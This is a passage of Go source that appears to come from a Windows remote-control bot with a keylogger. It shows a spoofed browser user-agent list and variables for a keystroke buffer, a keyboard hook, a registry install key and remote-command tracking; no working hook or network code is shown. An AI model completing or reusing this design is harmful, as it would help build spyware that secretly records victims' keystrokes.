		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
		"Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
		"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)",
	}

	ch   = make(chan struct{})
	quit = make(chan struct{})

	//Tmp Values
	myUID          string
	lastCommand    string
	didlastCommand bool
	tmpKeylog      strings.Builder
	tmpTitle       string
	caps           bool
	shift          bool
	myIP           string
	myName         string
	myInstallReg   string
	dogTreat       int
	keyboardHook   w32.HHOOK
	gHook          w32.HWINEVENTHOOK
)

